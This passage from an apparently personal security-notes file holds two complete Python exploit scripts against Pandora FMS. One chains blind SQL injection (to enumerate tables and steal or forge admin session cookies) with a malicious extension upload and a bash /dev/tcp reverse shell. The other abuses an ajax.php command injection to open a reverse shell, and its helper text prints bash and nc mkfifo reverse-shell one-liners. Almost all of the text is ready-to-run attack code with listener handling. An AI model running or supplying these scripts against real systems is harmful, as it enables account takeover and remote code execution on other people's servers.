+>                         print(Fore.GREEN + "\n\t[*] " + Style.RESET_ALL, end='') if char == ',' else print(Fore.CYAN + char + Style.RESET_ALL, end='')
+>                         break
+> 
+>         except KeyboardInterrupt:
+> 
+>             p.failure(Fore.RED + "Exiting... ⌛" + Style.RESET_ALL)
+>             time.sleep(1)
+> 
+>         p.success(Fore.GREEN + "Finished extracted DB Tables ✔" + Style.RESET_ALL)
+> 
+>         self.table = input(Fore.MAGENTA + f"\n\n[+] {Fore.YELLOW}Enter a DB Table to get its columns: " + Style.RESET_ALL) 
+> 
+>     def getDBColumnsLength(self) -> int:
+> 
+>         """
+>         This method gets the total length of all columns of a given table
+>         """
+> 
+>         signal.signal(signal.SIGINT, sigintHandler)
+> 
+>         print()
+>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
+>         p1.status(Fore.MAGENTA + "Extracting Total Length of All Columns... ⏳" + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         print()
+>         p2 = log.progress(Fore.CYAN + f"{self.table} columns' length" + Style.RESET_ALL)
+> 
+>         for number in range(1,200):
+> 
+>             r = self.makeSQLQuery(f"?session_id='+OR+IF(LENGTH((SELECT+GROUP_CONCAT(column_name)+FROM+information_schema.columns+WHERE+table_schema='{self.database}'+AND+table_name='{self.table}'))='{number}',0,1)+--+-")
+> 
+>             p2.status(Fore.RED + str(number) + Style.RESET_ALL)
+> 
+>             if self.ACCESS_DENIED_MSG in r.text:
+> 
+>                 p2.success(Fore.GREEN + str(number) + Style.RESET_ALL)
+>                 p1.success(Fore.GREEN + f"Total Length of all Columns extracted for {self.table} ✔" + Style.RESET_ALL)
+> 
+>                 return number
+> 
+>     def getDBTableColumns(self) -> str:
+> 
+>         """
+>         This method performs a enumeration of the columns of a given DB Table
+>         It returns a list with the columns
+>         """
+>         
+>         self.columns_length = self.getDBColumnsLength()
+> 
+>         columns = ''
+> 
+>         print()
+>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
+> 
+>         p1.status(Fore.MAGENTA + f"Extracting Columns for {self.table} DB Table... ⏳" + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         print()
+>         p2 = log.progress(Fore.GREEN + "Columns" + Style.RESET_ALL)
+> 
+>         for position in range(1, self.columns_length + 1):
+> 
+>             for char in self.chars + ',':
+> 
+>                 r = self.makeSQLQuery(f"?session_id='+or+IF(SUBSTR((SELECT+GROUP_CONCAT(column_name)+FROM+information_schema.columns+WHERE+table_schema='{self.database}'+and+table_name='{self.table}'),{position},1)='{char}',0,1)+--+-")
+> 
+>                 p2.status(Fore.CYAN + columns + char + Style.RESET_ALL)
+> 
+>                 if self.ACCESS_DENIED_MSG in r.text:
+> 
+>                     columns += char if char != ',' else char + ' '
+>                     break
+> 
+>         p2.success(Fore.GREEN + f"{columns}" + Style.RESET_ALL)
+>         p1.success(Fore.GREEN + f"Columns of {self.table} extracted ✔" + Style.RESET_ALL)
+> 
+>         return [ column.strip() for column in columns.split(',') ]
+> 
+>     def generateAdminCookie(self) -> None:
+> 
+>         """
+>         This method is the main entry point. It performs a SQL Injection by entering the below query
+>         as the value of the session_id parameter, which is not propertly sanitized as we can in the
+>         previous methods
+> 
+>         It creates an instance attribute containing the value of the cookie 
+> 
+>         Note that this method will only be called if there are no admin cookies stored in the database
+>         """
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + "Generating Admin Cookie ⌛..." + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         r = self.makeSQLQuery("?session_id='+UNION+SELECT+1,2,'id_usuario|s:5:%22admin%22;'+--+-")
+> 
+>         if "Pandora FMS Graph ( - )" in r.text:
+> 
+>             p.success(Fore.GREEN + "Admin Cookie 🍪 generated successfully ✓" + Style.RESET_ALL)
+>             self.admin_cookie = r.cookies.get('PHPSESSID')
+> 
+>         else:
+>             p.failure(Fore.RED + "Something went wrong trying to generate an Admin Cookie ❌" + Style.RESET_ALL)
+>             sys.exit(1)
+> 
+>     def getAdminCookieNumber(self) -> None:
+> 
+>         """
+>         This method extracts the number of admin cookies stored in the database
+>         """
+> 
+>         print()
+>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
+>         p1.status(Fore.MAGENTA + "Checking if there is any Admin Cookie ⏳..." + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         print()
+>         p2 = log.progress(Fore.CYAN + "Admin Cookie[s] Number" + Style.RESET_ALL)
+> 
+>         for number in range(0,21):
+> 
+>             r = self.makeSQLQuery(f"?session_id='+OR+IF((SELECT+COUNT(*)+FROM+{self.table}+WHERE+data+LIKE+'%25admin%25')={number},0,1)+--+-")
+> 
+>             p2.status(Fore.MAGENTA + str(number) + Style.RESET_ALL)
+> 
+>             if self.ACCESS_DENIED_MSG in r.text and number != 0:
+> 
+>                 p2.success(Fore.GREEN + str(number) + Style.RESET_ALL)
+>                 p1.success(Fore.GREEN + "Number of Admin Cookies 🍪 extracted ✔" + Style.RESET_ALL)
+> 
+>                 return True
+> 
+>         p2.failure(Fore.RED + "0" + Style.RESET_ALL)
+>         p1.failure(Fore.RED + "There is no Admin Cookie 🍪" + Style.RESET_ALL)
+> 
+>         return False
+> 
+>     def getAdminCookieLength(self) -> None:
+> 
+>         """
+>         This method obtains the total lenght of all Admin Cookies stored in the database and returns and set
+>         this value as an attribute of the object
+>         """
+> 
+>         print()
+>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
+>         p1.status(Fore.MAGENTA + "Extracting Admin Cookie[s] 🍪 length... ⏳" + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         print()
+>         p2 = log.progress(Fore.CYAN + "Admin Cookie[s] Length" + Style.RESET_ALL)
+> 
+>         for number in range(1, 800):
+> 
+>             r = self.makeSQLQuery(f"?session_id='+OR+IF(LENGTH((SELECT+GROUP_CONCAT(id_session)+FROM+{self.table}+where+data+like+'%25admin%25'))={number},0,1)+--+-")
+> 
+>             p2.status(Fore.RED + str(number) + Style.RESET_ALL)
+> 
+>             if self.ACCESS_DENIED_MSG in r.text:
+> 
+>                 p2.success(Fore.GREEN + str(number) + Style.RESET_ALL)
+>                 p1.success(Fore.GREEN + "Admin Cookie[s] length extracted ✔" + Style.RESET_ALL)
+>                 self.adminCookie_length = number
+>                 break
+> 
+>     def getAdminCookie(self) -> None:
+> 
+>         """
+>         This method extracts the admin Cookies stored in the database
+> 
+>         It will only be called if there are any admin cookies stored in the database
+>         """
+> 
+>         print()
+>         p1 = log.progress(Fore.CYAN + "SQLi" + Style.RESET_ALL)
+>         p1.status(Fore.MAGENTA + f"Extracting Cookies Admin 🍪 from id_session column... ⌛" + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         print()
+>         p2 = log.progress(Fore.CYAN + "Admin Cookie[s] 🍪" + Style.RESET_ALL)
+> 
+>         for position in range(1, self.adminCookie_length + 1):
+> 
+>             for char in self.chars + ',':
+> 
+>                 r = self.makeSQLQuery(f"?session_id='+OR+IF(SUBSTR((SELECT+GROUP_CONCAT(id_session)+FROM+{self.table}+WHERE+data+like+'%25admin%25'),{position},1)='{char}',0,1)+--+-")
+> 
+>                 p2.status(Fore.RED + self.admin_cookie + char + Style.RESET_ALL)
+> 
+>                 if self.ACCESS_DENIED_MSG in r.text:
+> 
+>                     self.admin_cookie += char if char != ',' else char + ' '
+>                     break
+> 
+>         p2.success(Fore.GREEN + f"{self.admin_cookie}" + Style.RESET_ALL)
+>         p1.success(Fore.GREEN + "Admin Cookie[s] extracted ✔" + Style.RESET_ALL)
+> 
+>     def runSQLInjection(self) -> None:
+> 
+>         self.getDBTables()
+>         self.getDBTableColumns()
+> 
+>         if not self.getAdminCookieNumber():
+> 
+>             self.generateAdminCookie()
+> 
+>         else:
+>             self.getAdminCookieLength()
+>             self.getAdminCookie()
+> 
+>         return [ cookie.strip() for cookie in self.admin_cookie.split(',') ]
+> 
+> class Shell():
+> 
+>     def __init__(self, url: str, ip: str, port: int, cookie: str) -> None:
+> 
+>         self.url = url.strip('/') 
+>         self.ip = ip
+>         self.port = port
+>         self.cookie = cookie
+>         self.file = "shell.zip"
+>         self.payload = f'bash -c "bash -i %26> /dev/tcp/{self.ip}/{self.port} 0>%261"'
+> 
+>     def uploadMaliciousExtension(self) -> None:
+> 
+>         """
+>         This method, being authenticated as a Pandora Admin user, uploads a malicious extension which allows an attacker,
+>         later on, to execute arbitrary commands by a PHP web shell
+> 
+>         It sends a POST Request to upload the extension using the previously extracted admin cookie
+>         """
+> 
+>         upload_url = self.url + '/index.php?sec=godmode/extensions&sec2=extensions/extension_uploader'
+> 
+>         cookies = { 'PHPSESSID' : self.cookie }
+> 
+>         data = {
+>             "upload" : "1",
+>             "submit" : "Upload"
+>         }
+> 
+>         with open(self.file, "rb") as f:
+> 
+>             files = { 'extension' : (self.file, f.read(), 'application/zip') }
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "Pandora Extension" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + "Uploading malicious extension... ⌛" + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         try:
+>             r = requests.post(upload_url, data=data, cookies=cookies, files=files)
+> 
+>             if "Extension uploaded successfully" in r.text:
+> 
+>                 p.success(Fore.GREEN + "Extension uploaded successfully ✔" + Style.RESET_ALL)
+>                 return True
+> 
+>             else:
+> 
+>                 p.failure(Fore.RED + "Something went wrong trying to upload the malicious extension ❌" + Style.RESET_ALL)
+>                 return False
+> 
+>         except Exception as e:
+> 
+>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
+>             sys.exit(1)
+> 
+>     def setListener(self) -> None:
+> 
+>         """
+>         This Method, executed by a thread, carries out the following actions:
+> 
+>             - Set a Listen Socket in the specified TCP/IP Stack
+>             - Wait a Remote Connection (From the Payload sent)
+>             - Stablish a Connection and receives a Reverse Shell from the Target
+>         """
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "Socket" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + f"Setting up a listener on {self.ip}:{self.port} ⌛..." + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+> 
+>             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+>             s.bind((self.ip, int(self.port)))
+>             s.listen(1)
+> 
+>             conn, addr = s.accept()
+>             p.status(Fore.GREEN + f"Connection received from {addr[0]}:{addr[1]}. Press [Enter] to get the Shell" + Style.RESET_ALL)
+> 
+>             print(Fore.MAGENTA + f"[+] {Fore.YELLOW}Press Enter to get the shell" + Style.RESET_ALL)
+>             print(Fore.MAGENTA + f"\n[+] {Fore.YELLOW}Press C-c or type \"exit\" to leave the shell\n" + Style.RESET_ALL)
+> 
+>             print(conn.recv(4096).decode(), end='')
+> 
+>             while True:
+> 
+>                 cmd = input()
+> 
+>                 if cmd != "exit":
+> 
+>                     conn.send((cmd + '\n').encode())
+>                     time.sleep(1)
+> 
+>                     print(conn.recv(4096).decode(), end='')
+> 
+>                 else:
+>                     p.failure(Fore.RED + "Socket closed ✔" + Style.RESET_ALL)
+>                     break
+> 
+>     def getReverseShell(self) -> None:
+> 
+>         """
+>         This method performs an HTTP GET Request to the loaded extension to send a reverse shell
+>         to the listening socket
+>         """
+> 
+>         extension_url = self.url + '/extensions/shell.php'
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "Reverse Shell" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + f"Sending the Reverse shell to {self.ip}:{self.port}... ⌛" + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         print(revShellWarning(self.ip, self.port))
+> 
+>         try:
+>             r = requests.get(extension_url + f'?cmd={self.payload}')
+> 
+>             if r.status_code == 200:
+> 
+>                 p.success(Fore.GREEN + f"Reverse Shell sent correctly to {self.ip}:{self.port} ✔" + Style.RESET_ALL) 
+>                 return True
+> 
+>             else:
+>                 p.failure(Fore.RED + "Something went wrong trying to send the reverse shell ❌" + Style.RESET_ALL)
+>                 return False
+> 
+>         except Exception as e:
+> 
+>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
+>             sys.exit(1)
+> 
+>     def runShell(self) -> None:
+> 
+>         exit(99) if not self.cookie else None
+> 
+>         if self.uploadMaliciousExtension():
+> 
+>             lthread = threading.Thread(target=self.setListener)
+>             lthread.start()
+>             time.sleep(2)
+> 
+>             self.getReverseShell()
+> 
+>             lthread.join()
+> 
+> def main() -> None:
+> 
+>     print(banner())
+> 
+>     signal.signal(signal.SIGINT, sigintHandler)
+> 
+>     parser = argparse.ArgumentParser(
+>         description=Fore.MAGENTA + "SQLi to exploit Pandora FMS 7.0" + Style.RESET_ALL
+>     )
+> 
+>     parser.add_argument('url', help="Pandora FMS Console URL e.g. http://domain.tld/pandora_console")
+>     parser.add_argument('ip', help="Attacker IP Address")
+>     parser.add_argument('port', help="Attacker Listening Port")
+> 
+>     opts = parser.parse_args()
+> 
+>     if any(not opt for opt in (opts.url, opts.ip, opts.port)):
+> 
+>         parser.print_help()
+>         sys.exit(1)
+> 
+>     sqli = SQLInjection(opts.url)
+> 
+>     admin_cookie = sqli.runSQLInjection()
+> 
+>     shell = Shell(opts.url, opts.ip, opts.port, admin_cookie[0])
+> 
+>     shell.runShell()
+>     
+> if __name__ == '__main__':
+> 
+>     main()
+> ```
+>
+
+![[CVE-2021-32099_extended.gif|450]]
+
+##### *CVE-2020-13851.py*
+
+> ***[Reference](https://github.com/4l3xBB/Exploits/tree/main/CVE-2020-13851)***
+
+> [!BUG]- *CVE-2020-13851.py*
+>
+> ```python
+> #!/usr/bin/env python3
+> 
+> import signal
+> import os
+> import sys
+> import argparse
+> import requests
+> import threading
+> 
+> from pwn import *
+> from colorama import Fore, Style
+> 
+> def sigIntHandler(sig: signal.Signals, frame: types.FrameType | None) -> None:
+> 
+>     print('\n')
+>     p = log.progress(Fore.CYAN + "Signal ⚡" + Style.RESET_ALL)
+>     p.status(Fore.MAGENTA + f"SIGINT signal sent to {sys.argv[0]}. {Fore.RED}Exiting... ⌛" + Style.RESET_ALL)
+> 
+>     time.sleep(1)
+> 
+>     signal.signal(signal.SIGINT, signal.SIG_DFL)
+> 
+>     os.killpg(os.getpid(), signal.SIGINT)
+> 
+> def banner() -> str:
+> 
+>     return Fore.MAGENTA + '''
+>    _______    ________    ___   ____ ___   ____       ________ ____  _________
+>   / ____/ |  / / ____/   |__ \ / __ \__ \ / __ \     <  /__  /( __ )/ ____<  /
+>  / /    | | / / __/________/ // / / /_/ // / / /_____/ / /_ </ __  /___ \ / / 
+> / /___  | |/ / /__/_____/ __// /_/ / __// /_/ /_____/ /___/ / /_/ /___/ // /  
+> \____/  |___/_____/    /____/\____/____/\____/     /_//____/\____/_____//_/   
+>     ''' + Style.RESET_ALL
+> 
+> def revShellWarning(ip: str, port: int) -> str:
+> 
+>     return f'''{Fore.MAGENTA}
+> [!] {Fore.RED}The Reverse Shell obtained is not associated with a stable TTY/PTY ❗
+> 
+> {Fore.MAGENTA}[+] {Fore.BLUE}Try to stablish another reverse connection as follows →
+> 
+>     {Fore.CYAN}[*] {Fore.MAGENTA}bash -c "bash -i &> /dev/tcp/{ip}/{int(port)} 0>&1
+> 
+>     {Fore.CYAN}[*] {Fore.MAGENTA}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {int(port)} >/tmp/f{Style.RESET_ALL}
+>     '''
+> 
+> class Exploit:
+> 
+>     def __init__(self, url: str, ip: str, port: int, user: str = None, passwd: str = None, cookie: str = None) -> None:
+> 
+>         self.url = url.rstrip('/')
+>         self.ip = ip
+>         self.port = port
+>         self.payload = f'bash -c "bash -i &> /dev/tcp/{self.ip}/{self.port} 0>&1"'
+> 
+>         self.session = requests.Session()
+> 
+>         if all((user, passwd)):
+> 
+>             self.user = user
+>             self.passwd = passwd
+> 
+>         elif cookie:
+> 
+>             self.session.cookies.update({ 'PHPSESSID' : cookie })
+> 
+>     def _exceptionMsg(self, message: str) -> str:
+> 
+>         log.failure(Fore.RED + message + Style.RESET_ALL)
+> 
+>     def loginPandora(self) -> bool:
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "Pandora Login 💀" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + "Logging into the Pandora FMS Panel ⌛..." + Style.RESET_ALL)
+> 
+>         time.sleep(1)
+> 
+>         login_url = self.url + '/index.php?login=1'
+> 
+>         post_data = {
+> 
+>             'nick' : self.user,
+>             'pass' : self.passwd,
+>             'login_button' : 'Login'
+>         }
+> 
+>         try:
+>             r = self.session.post(login_url, data=post_data)
+> 
+>             if "Pandora FMS Overview" in r.text:
+> 
+>                 p.success(Fore.GREEN + "Logged successfully in Pandora FMS ✔" + Style.RESET_ALL)
+>                 return True
+> 
+>             else:
+>                 p.failure(Fore.RED + "Could not log into the Pandora FMS Panel ❌" + Style.RESET_ALL)
+>                 return False
+> 
+>         except requests.RequestException as e:
+> 
+>             self._exceptionMsg(f"Request Error: {e}")
+>             return False
+> 
+>     def setListener(self) -> None:
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "Socket ⚙" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + f"Waiting for connections on {self.ip}:{self.port}" + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         try:
+>             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+> 
+>                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+>                 s.bind((self.ip, int(self.port)))
+>                 s.listen(1)
+> 
+>                 conn, addr = s.accept()
+> 
+>                 p.status(Fore.GREEN + f"Connection received from {addr[0]}:{addr[1]}" + Style.RESET_ALL)
+> 
+>                 print(revShellWarning(self.ip, self.port))
+> 
+>                 print(Fore.RED + f'[+] {Fore.YELLOW}Press [Enter] to get the Reverse Shell' + Style.RESET_ALL)
+>                 print(Fore.RED + f'\n[+] {Fore.YELLOW}Press C-c or type "exit" to quit the Shell\n' + Style.RESET_ALL)
+> 
+>                 print(conn.recv(4096).decode(), end='')
+> 
+>                 while True:
+> 
+>                     cmd = input()
+> 
+>                     if cmd.lower() == "exit":
+> 
+>                         p.failure(Fore.RED + "Exiting ⌛...")
+>                         time.sleep(1)
+>                         break
+>                     else:
+>                         conn.send((cmd + '\n').encode())
+>                         time.sleep(1)
+> 
+>                         print(conn.recv(4096).decode(), end='')
+> 
+>         except socket.error as e:
+> 
+>             self._exceptionMsg(f"Socket Error: {e}")
+>             sys.exit(1)
+> 
+>         except Exception as e:
+> 
+>             self._exceptionMsg(f"Error: {e}")
+>             sys.exit(1)
+> 
+>     def getReverseShell(self) -> None:
+> 
+>         print()
+>         p = log.progress(Fore.CYAN + "Rev Shell 🐉" + Style.RESET_ALL)
+>         p.status(Fore.MAGENTA + "Sending the Rev Shell to the listening socket ⌛..." + Style.RESET_ALL)
+>         time.sleep(1)
+> 
+>         url = self.url + '/ajax.php'
+> 
+>         post_data = {
+> 
+>             'page' : 'include/ajax/events',
+>             'perform_event_response' : '10000000',
+>             'target' : self.payload,
+>             'response_id' : '1'
+>         }
+> 
+>         try:
+>             r = self.session.post(url, data=post_data)
+> 
+>             p.success(Fore.GREEN + "Reverse Shell received correctly ✔" + Style.RESET_ALL)
+> 
+>         except requests.RequestException as e:
+> 
+>             self._exceptionMsg(f"Request Error: {e}")
+>             return False
+> 
+>     def runExploit(self, cookie: str = None) -> None:
+> 
+>         lthread = threading.Thread(target=self.setListener)
+>         lthread.start()
+> 
+>         time.sleep(1)
+> 
+>         if not self.session.cookies:
+> 
+>             self.loginPandora()
+>             self.getReverseShell()
+> 
+>         else:
+>             self.getReverseShell()
+> 
+>         lthread.join()
+> 
+> def main() -> None:
+> 
+>     print(banner())
+> 
+>     signal.signal(signal.SIGINT, sigIntHandler)
+> 
+>     parser = argparse.ArgumentParser(
+> 
+>         description=Fore.MAGENTA + "CVE-XXXX-XXXX" + Style.RESET_ALL
+>     )
+> 
+>     parser.add_argument('url', metavar='pandora_url', help='Pandora Console URL e.g. http://locahost/pandora_console')
+>     parser.add_argument('ip', metavar='attacker_ip', help='Attacker IP Address')
+>     parser.add_argument('port', metavar='attacker_port', type=int, help='Attacker Port')
+>     parser.add_argument('-u', '--user', metavar='pandora_user', help='Pandora Console User')
+>     parser.add_argument('-p', '--password', metavar='pandora_password', help='Pandora Console Password for the provided user')
+>     parser.add_argument('-c', '--cookie', metavar='pandora_cookie', help='Pandora Console\'s PHPSESSID Cookie')
+> 
+>     opts = parser.parse_args()
+> 
+>     if any(not opt for opt in (opts.url, opts.ip, opts.port)):
+> 
+>         parser.print_help()
+>         sys.exit(1)
+> 
+>     if opts.cookie and (opts.user or opts.password):
+> 
+>         print()
+>         log.failure(Fore.RED + "Error: Provide either a cookie OR user+password, not both\n" + Style.RESET_ALL)
+>         sys.exit(1)
+> 
+>     exploit = Exploit(opts.url, opts.ip, opts.port, opts.user, opts.password, opts.cookie)
+> 
+>     exploit.runExploit()
+> 
+> if __name__ == '__main__':
+> 
+>     main()
+> ```
+>
+
+![[CVE-2020-13851.gif|450]]
